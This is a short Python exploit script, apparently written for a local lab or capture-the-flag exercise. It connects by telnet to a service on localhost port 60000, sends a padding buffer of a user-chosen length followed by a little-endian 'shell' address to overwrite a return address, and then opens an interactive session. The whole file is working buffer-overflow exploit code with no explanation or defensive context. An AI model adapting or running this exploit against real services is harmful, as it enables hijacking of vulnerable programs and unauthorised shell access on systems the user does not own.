#!/usr/bin/python3
import telnetlib

# Open connection to the specified host and port
tn = telnetlib.Telnet("127.0.0.1", 60000)

# User inputs for offset and target address
offset = int(input("Offset (e.g., 40?): "))
target_addr = input("Target (shell) address (e.g., 5647740e61b5): ")

# Create a buffer of 'x' characters based on the specified offset
buff = offset * (b'x')

# Convert the target address from hexadecimal and reverse the byte order
addr = bytearray.fromhex(target_addr)
addr.reverse()

# Append the reversed address to the buffer
buff += addr

# Sending the crafted buffer to the target
tn.write(buff)

# Emulate telnet/terminal interaction
tn.interact()
